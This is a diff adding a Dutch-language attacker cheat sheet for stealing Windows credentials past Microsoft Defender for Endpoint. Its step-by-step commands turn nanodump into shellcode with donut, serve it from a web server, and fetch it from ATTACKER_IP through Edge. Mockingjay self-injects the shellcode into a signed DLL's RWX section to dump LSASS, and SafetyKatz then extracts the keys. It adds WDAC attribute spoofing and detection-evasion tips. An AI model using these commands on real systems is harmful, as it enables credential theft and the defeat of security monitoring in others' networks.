@@ -1,0 +1,57 @@
+# MDE Bypass — Microsoft Defender for Endpoint omzeilen voor credential extractie
+# Gebruik Mockingjay (RWX DLL injection) + nanodump (covert LSASS dump) + donut (shellcode)
+
+# === Overzicht ===
+# Probleem: MDE detecteert standaard credential dumping tools
+# Oplossing: Converteer nanodump naar shellcode, injecteer via Mockingjay in een RWX
+#            sectie van een legitimate Microsoft DLL (mscorlib.ni.dll)
+
+# === Stap 1: Maak nanodump shellcode (op attacker machine) ===
+donut.exe -f 1 -p " -sc -f --write nano.dmp" -i nanodump.x64.exe -o nano.bin
+
+# Opties:
+# -f 1      : Output formaat (raw shellcode)
+# -p        : Parameters voor nanodump (-sc = spoof callstack, -f = fork, --write = schrijf dump)
+# -i        : Input executable
+# -o        : Output shellcode bestand
+
+# === Stap 2: Host het shellcode bestand ===
+# Start een webserver
+python3 -m http.server 80
+
+# === Stap 3: Download op het doel (vermijd certutil — gebruik Edge) ===
+"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --incognito http://ATTACKER_IP/mockingjay.zip
+
+# === Stap 4: Pas WDAC attributen aan (indien nodig) ===
+rcedit-x64.exe mockingjay.exe --set-version-string "ProductName" "Vmware Workstation"
+
+# === Stap 5: Voer Mockingjay uit ===
+mockingjay.exe ATTACKER_IP "/nano.bin"
+
+# Mockingjay:
+# - Zoekt een DLL met een RWX sectie (bijv. mscorlib.ni.dll)
+# - Download shellcode van ATTACKER_IP/nano.bin
+# - Injecteert in het eigen proces (self-injection, geen remote injection)
+# - Shellcode voert nanodump uit → schrijft nano.dmp
+
+# === Stap 6: Herstel dump signature ===
+restore_signature.exe nano.dmp
+# nanodump verwijdert de MiniDump signature om detectie te voorkomen
+# restore_signature zet deze terug zodat mimikatz het kan parseren
+
+# === Stap 7: Parseer de dump ===
+SafetyKatz.exe "sekurlsa::minidump nano.dmp" "sekurlsa::evasive-keys" "exit"
+
+# === Alternatief: comsvcs.dll (DETECTED door MDE) ===
+# Dit wordt wél gedetecteerd:
+# rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump PID C:\Users\Public\lsass.dmp full
+
+# === EDR Detectie checken ===
+Invoke-EDRChecker -Remote -ComputerName TARGET
+DefenderCheck.exe payload.exe
+
+# Noot: Mockingjay misbruikt RWX secties in legitimate signed DLLs
+# Noot: Self-injection (geen CreateRemoteThread) → minder detectie
+# Noot: nanodump forkt het LSASS proces en spooft de callstack
+# Noot: Gebruik Edge voor downloads — certutil wordt gedetecteerd door MDE
+# Noot: set username in plaats van whoami.exe (whoami wordt gedetecteerd)
